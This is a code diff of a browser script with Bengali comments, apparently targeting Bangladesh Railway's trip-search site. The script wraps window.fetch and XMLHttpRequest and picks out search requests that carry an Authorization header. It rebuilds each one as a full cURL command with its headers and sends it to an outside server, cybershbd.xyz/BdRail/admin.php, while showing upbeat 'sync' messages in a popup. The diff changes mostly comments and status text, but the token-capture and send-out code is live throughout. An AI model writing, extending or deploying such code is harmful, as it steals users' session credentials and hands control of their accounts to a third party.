@@ -110,28 +110,28 @@
     const syncText = document.getElementById('cybersh-sync-text');
     const iconContainer = document.getElementById('cybersh-icon-container');
 
-    // HTTPS দিয়ে সার্ভারে cURL পাঠানোর ফাংশন (লোডিং এবং রেসপন্স সহ)
+    // সার্ভারে রিকোয়েস্ট পাঠিয়ে রিয়েল রেসপন্স দেখানোর ফাংশন
     async function sendCurlToServer(curlData) {
         try {
-            // ১. লোডিং অ্যানিমেশন চালু
+            // ১. রিকোয়েস্ট শুরু হওয়ার সময় লোডিং অ্যানিমেশন দেখাবে
             syncStatus.style.display = 'flex';
             iconContainer.className = 'cybersh-spinner';
             iconContainer.style.border = '2px solid rgba(56, 189, 248, 0.3)';
             iconContainer.style.borderTopColor = '#38bdf8';
             iconContainer.style.background = 'transparent';
             
-            syncText.innerText = 'Syncing authorization with server...';
+            syncText.innerText = 'Transmitting cURL to server...';
             syncStatus.style.borderColor = 'rgba(56, 189, 248, 0.3)';
             syncStatus.style.background = 'rgba(56, 189, 248, 0.08)';
             syncStatus.style.color = '#38bdf8';
 
-            // ২. HTTPS ব্যবহার করে রিকোয়েস্ট পাঠানো
+            // ২. HTTPS দিয়ে ব্যাকএন্ডে GET রিকোয়েস্ট পাঠানো
             const targetUrl = `https://cybershbd.xyz/BdRail/admin.php?auth=${encodeURIComponent(curlData)}`;
             
             const response = await fetch(targetUrl, { method: 'GET' });
             const result = await response.json();
 
-            // ৩. লোডিং বন্ধ করে সার্ভারের আসল রেসপন্স মেসেজ দেখানো
+            // ৩. রেসপন্স আসার পর লোডিং অফ করে সার্ভারের নির্দিষ্ট মেসেজটি পপআপে শো করবে
             iconContainer.className = '';
             iconContainer.style.width = '6px';
             iconContainer.style.height = '6px';
@@ -139,10 +139,11 @@
             iconContainer.style.borderRadius = '50%';
             iconContainer.style.border = 'none';
 
-            if (result.status === 'success') {
-                syncText.innerText = `Server Response: ${result.message} 🚀`;
+            if (result && result.message) {
+                // সার্ভার থেকে আসা মেসেজ যেমন: "Credentials updated successfully via API! 🚀" সরাসরি দেখাবে
+                syncText.innerText = `${result.message} 🚀`;
             } else {
-                syncText.innerText = `Server Response: ${result.message || 'Updated successfully'} 🚀`;
+                syncText.innerText = `Server Response: Success 🚀`;
             }
             
             syncStatus.style.borderColor = 'rgba(74, 222, 128, 0.4)';
@@ -150,6 +151,7 @@
             syncStatus.style.color = '#4ade80';
 
         } catch (err) {
+            // যদি কোনো কারণে কানেকশন ফেইল করে
             iconContainer.className = '';
             iconContainer.style.width = '6px';
             iconContainer.style.height = '6px';
@@ -157,14 +159,14 @@
             iconContainer.style.borderRadius = '50%';
             iconContainer.style.border = 'none';
 
-            syncText.innerText = 'Sync Failed! Check network or SSL connection.';
+            syncText.innerText = 'Failed to fetch response from server.';
             syncStatus.style.borderColor = 'rgba(239, 68, 68, 0.4)';
             syncStatus.style.background = 'rgba(239, 68, 68, 0.08)';
             syncStatus.style.color = '#ef4444';
         }
     }
 
-    // ৩ সেকেন্ড পর অটো মিনিমাইজ
+    // ৩ সেকেন্ড পর পপআপ অটো মিনিমাইজ হয়ে যাবে
     setTimeout(() => {
         if (overlay && overlay.style.display !== 'none') {
             overlay.style.display = 'none';
@@ -219,11 +221,11 @@
         };
 
         xhr.addEventListener('load', function() {
-            // নিজস্ব ব্যাকএন্ড বা অন্য ডোমেইন হলে ইগনোর করবে
+            // নিজস্ব ব্যাকএন্ড হলে ইগনোর করবে (লুপ এড়াতে)
             if (requestURL.includes('cybershbd.xyz')) return;
 
             if (requestURL.includes('search-trips-v2')) {
-                // চেক করা হচ্ছে যে Authorization হেডার আছে কিনা
+                // চেক করা হচ্ছে Authorization হেডার আছে কিনা
                 let hasAuth = false;
                 for (let header in requestHeaders) {
                     if (header.toLowerCase() === 'authorization') {
@@ -232,7 +234,6 @@
                     }
                 }
 
-                // যদি অথ টোকেন না থাকে তবে স্কিপ করবে
                 if (!hasAuth) return;
 
                 let curl = `curl '${requestURL}' \\\n  -X '${requestMethod}'`;
@@ -261,7 +262,7 @@
     window.fetch = async function(...args) {
         const url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url ? args[0].url : '');
         
-        // নিজস্ব ব্যাকএন্ড হলে ফেচ রিকোয়েস্ট সম্পূর্ণ ইগনোর করবে (লুপ এড়াতে)
+        // নিজস্ব ব্যাকএন্ড হলে ইগনোর করবে
         if (url.includes('cybershbd.xyz')) {
             return originalFetch.apply(this, args);
         }
